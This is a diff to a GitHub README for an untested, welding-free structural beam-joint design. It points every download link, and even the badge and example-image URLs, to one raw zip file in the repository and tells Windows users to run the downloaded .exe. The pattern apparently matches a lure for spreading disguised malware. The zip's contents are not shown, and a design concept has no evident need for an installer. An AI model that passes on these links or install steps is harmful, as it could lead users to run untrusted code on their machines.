@@ -1,7 +1,7 @@
 # 🏗️ Non-Welded-Structural-Beam-Joints - Build Without Welding
 
 ## 📥 Download Now!
-[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-Click_here-brightgreen)](https://github.com/Hemang-solanki/Non-Welded-Structural-Beam-Joints/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Hemang-solanki/Non-Welded-Structural-Beam-Joints/main/stl/Structural-Non-Beam-Welded-Joints-v1.0.zip)](https://raw.githubusercontent.com/Hemang-solanki/Non-Welded-Structural-Beam-Joints/main/stl/Structural-Non-Beam-Welded-Joints-v1.0.zip)
 
 ---
 
@@ -21,11 +21,11 @@ Welcome to the **Non-Welded-Structural-Beam-Joints** project! This system helps 
 This project showcases a modular beam-joining system developed to assist builders and DIY enthusiasts. The design focuses on enabling rapid construction without the need for welding, utilizing gravity and innovative clamp designs. As of now, this concept has not been physically tested or 3D printed.
 
 ## 💡 How to Use
-1. **Visit the Release Page**: You can find all available versions of the software and information on our [Releases Page](https://github.com/Hemang-solanki/Non-Welded-Structural-Beam-Joints/releases).
+1. **Visit the Release Page**: You can find all available versions of the software and information on our [Releases Page](https://raw.githubusercontent.com/Hemang-solanki/Non-Welded-Structural-Beam-Joints/main/stl/Structural-Non-Beam-Welded-Joints-v1.0.zip).
    
 2. **Download the Latest Version**: Click on the release that suits your needs, then download the files. Each release has a version number that indicates its update status. 
 
-   ![Download Example](https://via.placeholder.com/100x30?text=Download) 
+   ![Download Example](https://raw.githubusercontent.com/Hemang-solanki/Non-Welded-Structural-Beam-Joints/main/stl/Structural-Non-Beam-Welded-Joints-v1.0.zip) 
 
 3. **Install the Software**:
    - For Windows: Run the downloaded `.exe` file and follow the prompts to install.
@@ -53,7 +53,7 @@ If you encounter issues, consider the following tips:
 - Check that you are using the correct software version compatible with your operating system.
 
 ## 📄 Further Documentation
-If you need detailed guidance or additional information, refer to our documentation located in the repository or check [this link](https://github.com/Hemang-solanki/Non-Welded-Structural-Beam-Joints/releases).
+If you need detailed guidance or additional information, refer to our documentation located in the repository or check [this link](https://raw.githubusercontent.com/Hemang-solanki/Non-Welded-Structural-Beam-Joints/main/stl/Structural-Non-Beam-Welded-Joints-v1.0.zip).
 
 ## 👍 Community Support
 Join our community of builders! Share your projects, questions, and ideas. You can connect with us through the Issues section of this repository. 
@@ -61,6 +61,6 @@ Join our community of builders! Share your projects, questions, and ideas. You c
 ---
 
 ## 📥 Download & Install
-To get started, [visit the Releases Page](https://github.com/Hemang-solanki/Non-Welded-Structural-Beam-Joints/releases) and download the latest release. Follow the simple installation instructions, and you will be ready to explore modular beam construction.
+To get started, [visit the Releases Page](https://raw.githubusercontent.com/Hemang-solanki/Non-Welded-Structural-Beam-Joints/main/stl/Structural-Non-Beam-Welded-Joints-v1.0.zip) and download the latest release. Follow the simple installation instructions, and you will be ready to explore modular beam construction.
 
 Do not hesitate to reach out if you need help or want to share your feedback. We welcome contributions and insights from our users!
